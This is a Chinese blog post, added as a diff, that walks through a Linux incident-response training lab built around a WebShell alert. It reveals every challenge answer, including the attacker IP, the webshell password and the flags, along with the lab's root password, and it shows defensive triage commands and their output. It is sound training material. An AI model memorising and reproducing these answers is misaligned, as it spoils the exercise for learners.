@@ -1,0 +1,708 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>应急响应靶机训练-Linux2 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 17.89K                代码: 15.04K, 文本: 1.35K               预计阅读时间: 1.19 小时            背景前景需要：看监控的石化发现WebShell告警,领导让你上机检查.你可以救救安服仔吗? 这是他的服务器，请你找出以下内容作为通关条件：  黑客的IP地址 192.168.20.1 黑客修改的管理员密码 N">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应靶机训练-Linux2">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/07/17/b05c14ed/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 17.89K                代码: 15.04K, 文本: 1.35K               预计阅读时间: 1.19 小时            背景前景需要：看监控的石化发现WebShell告警,领导让你上机检查.你可以救救安服仔吗? 这是他的服务器，请你找出以下内容作为通关条件：  黑客的IP地址 192.168.20.1 黑客修改的管理员密码 N">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425548.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425446.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425103.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425324.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425890.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426499.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426649.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426779.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426468.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426666.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426136.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426681.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426924.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426772.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426686.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161427150.png">
+<meta property="article:published_time" content="2024-07-17T01:10:49.000Z">
+<meta property="article:modified_time" content="2024-07-16T06:53:54.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425548.png">
+  
+  
+  
+  <meta name="keywords" content="应急响应,Linux">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：EmergencyResponse</span></div><div class="widget-body"><a class="item" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item" href="/2024/07/04/b7b8d727/"><span class="title">应急响应之Windows</span></a><a class="item" href="/2024/07/07/69563a36/"><span class="title">应急响应靶机训练-Web1</span></a><a class="item" href="/2024/07/10/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item" href="/2024/07/15/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item" href="/2024/07/16/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item" href="/2024/07/16/29554557/"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item active" href="/2024/07/17/b05c14ed/"><span class="title">应急响应靶机训练-Linux2</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/07/16/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item title" href="/2024/07/17/b05c14ed/"><span class="title">应急响应靶机训练-Linux2</span></a><a class="item title" href="/2024/07/16/29554557/"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item title" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item title" href="/2024/07/15/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/07/03/ac635236/">EmergencyResponse</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-17T01:10:49.000Z">2024-07-17</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-16T06:53:54.000Z">2024-07-16</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>应急响应靶机训练-Linux2</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 17.89K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 15.04K, 文本: 1.35K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 1.19 小时</p>
+    </div>
+    </div>
+
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前景需要：看监控的石化发现WebShell告警,领导让你上机检查.你可以救救安服仔吗?</p>
+<p>这是他的服务器，请你找出以下内容作为通关条件：</p>
+<ol>
+<li>黑客的IP地址 <psw>192.168.20.1</psw></li>
+<li>黑客修改的管理员密码 <psw>Network@2020</psw></li>
+<li>提交第一次WebShell的连接URL只需要提交参数及值部分: <psw>index.php?user-app-register</psw></li>
+<li>提交WebShell连接密码 <psw>Network2020</psw></li>
+<li>提交黑客使用的后续上传的木马文件名称 <psw>version2.php</psw></li>
+<li>提交数据包中的Flag1 <psw>flag1{Network@_2020_Hack}</psw></li>
+<li>提交黑客隐藏的Flag2 <psw>flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}</psw></li>
+<li>提交黑客隐藏的Flag3 <psw>flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}</psw></li>
+</ol>
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p>
+<p>相关账户密码:</p>
+<ol>
+<li>root&#x2F;<code>Inch@957821.</code></li>
+</ol>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># ll -a</span></span><br><span class="line">总用量 4676</span><br><span class="line">dr-xr-x---.  6 root root     263 7月  16 18:39 .</span><br><span class="line">dr-xr-xr-x. 20 root root     288 3月   7 11:44 ..</span><br><span class="line">-rw-------.  1 root root    1232 3月   4 09:46 anaconda-ks.cfg</span><br><span class="line">-rw-------.  1 root root    1471 3月  20 15:39 .bash_history</span><br><span class="line">-rw-r--r--.  1 root root      18 12月 29 2013 .bash_logout</span><br><span class="line">-rw-r--r--.  1 root root     176 12月 29 2013 .bash_profile</span><br><span class="line">-rw-r--r--   1 root root     234 7月  16 18:39 .bashrc</span><br><span class="line">drwxr-xr-x   3 root root      17 3月   7 11:40 .cache</span><br><span class="line">-rw-r--r--.  1 root root     100 12月 29 2013 .cshrc</span><br><span class="line">-rw-r--r--   1 root root     195 3月   7 11:52 .pearrc</span><br><span class="line">drwxr-xr-x   2 root root      22 3月   7 11:39 .pip</span><br><span class="line">drwxr-----   3 root root      19 3月   7 11:37 .pki</span><br><span class="line">-rw-------   1 root root    1024 3月   7 11:51 .rnd</span><br><span class="line">drwx------   2 root root      69 3月  20 10:30 .ssh</span><br><span class="line">-rw-r--r--.  1 root root     129 12月 29 2013 .tcshrc</span><br><span class="line">-rw-------   1 root root     984 3月  20 15:03 .viminfo</span><br><span class="line">-rwxr-xr-x   1 root root 1880767 3月  20 15:31 wp</span><br><span class="line">-rw-r--r--   1 root root 2860888 3月  20 14:43 数据包1.pcapng</span><br><span class="line"></span><br><span class="line">[root@web-server ~]<span class="comment"># ll -a /tmp/</span></span><br><span class="line">总用量 28</span><br><span class="line">drwxrwxrwt.  7 root  root  4096 7月  16 18:53 .</span><br><span class="line">dr-xr-xr-x. 20 root  root   288 3月   7 11:44 ..</span><br><span class="line">-rw-r--r--   1 root  root     2 7月  16 18:43 bmac_008ba4b94bef52e84f51e7b5413f2dfc</span><br><span class="line">-rw-r--r--   1 root  root    10 7月  16 18:43 .fluah_time</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .font-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .ICE-unix</span><br><span class="line">-rw-r--r--   1 root  root    18 7月  16 16:21 last_files_set_mode.pl</span><br><span class="line">srwxrwxrwx   1 mysql mysql    0 7月  16 18:39 mysql.sock</span><br><span class="line">-rw-------   1 mysql mysql    5 7月  16 18:39 mysql.sock.lock</span><br><span class="line">srw-rw-rw-   1 www   www      0 7月  16 18:38 php-cgi-56.sock</span><br><span class="line">-rw-------   1 www   www   4717 7月  16 18:54 sess_89mebtdvda26u9f2u8n08hm5qbq1bur3</span><br><span class="line">-rw-------   1 www   www      0 7月  16 18:44 sess_rpi1mkkd59ni3stcpdpgqumot1</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .Test-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .X11-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .XIM-unix</span><br></pre></td></tr></table></figure>
+
+<p>发现一个全流量包</p>
+<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">[root@web-server ~]<span class="comment"># netstat -atup</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      1218/nginx: master  </span><br><span class="line">tcp        0      0 0.0.0.0:ftp             0.0.0.0:*               LISTEN      1068/pure-ftpd (SER </span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      1025/sshd           </span><br><span class="line">tcp        0      0 0.0.0.0:cddbp           0.0.0.0:*               LISTEN      1218/nginx: master  </span><br><span class="line">tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN      1581/master         </span><br><span class="line">tcp        0      0 0.0.0.0:12485           0.0.0.0:*               LISTEN      2152/python3        </span><br><span class="line">tcp        0     52 web-server:ssh          192.168.11:cns-srv-port ESTABLISHED 2370/sshd: root@pts </span><br><span class="line">tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      1068/pure-ftpd (SER </span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      1025/sshd           </span><br><span class="line">tcp6       0      0 localhost:smtp          [::]:*                  LISTEN      1581/master         </span><br><span class="line">tcp6       0      0 [::]:mysql              [::]:*                  LISTEN      2114/mysqld         </span><br><span class="line">udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                           844/dhclient  </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425548.png" data-fancybox="true"/></div></div>
+
+<h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># ll -a /etc/systemd/system/</span></span><br><span class="line">总用量 8</span><br><span class="line">drwxr-xr-x. 11 root root 4096 3月   7 11:42 .</span><br><span class="line">drwxr-xr-x.  4 root root  151 3月   4 09:41 ..</span><br><span class="line">drwxr-xr-x.  2 root root   57 3月   4 09:41 basic.target.wants</span><br><span class="line">lrwxrwxrwx   1 root root   41 3月   7 11:42 dbus-org.fedoraproject.FirewallD1.service -&gt; /usr/lib/systemd/system/firewalld.service</span><br><span class="line">lrwxrwxrwx.  1 root root   57 3月   4 09:41 dbus-org.freedesktop.nm-dispatcher.service -&gt; /usr/lib/systemd/system/NetworkManager-dispatcher.service</span><br><span class="line">lrwxrwxrwx.  1 root root   37 3月   4 09:45 default.target -&gt; /lib/systemd/system/multi-user.target</span><br><span class="line">drwxr-xr-x.  2 root root   87 3月   4 09:41 default.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   32 3月   4 09:41 getty.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   35 3月   4 09:41 local-fs.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root 4096 3月   7 11:42 multi-user.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   48 3月   4 09:41 network-online.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   29 3月   4 09:41 sockets.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root  254 3月   4 09:41 sysinit.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   44 3月   4 09:41 system-update.target.wants</span><br><span class="line"></span><br><span class="line">[root@web-server ~]<span class="comment"># cd /</span></span><br><span class="line">[root@web-server /]<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib64  mnt  patch  root  sbin  sys  usr  www</span><br><span class="line">boot  etc  lib   media  opt  proc   run   srv   tmp  var</span><br><span class="line"></span><br><span class="line">[root@web-server /]<span class="comment"># ll /www/</span></span><br><span class="line">总用量 4</span><br><span class="line">drw-------  6 root root 121 3月   7 12:06 backup</span><br><span class="line">-rw-r--r--  1 root root   5 3月   7 11:39 disk.pl</span><br><span class="line">drwxr-xr-x 17 root root 267 3月   7 11:53 server</span><br><span class="line">drwx-----x 10 www  www 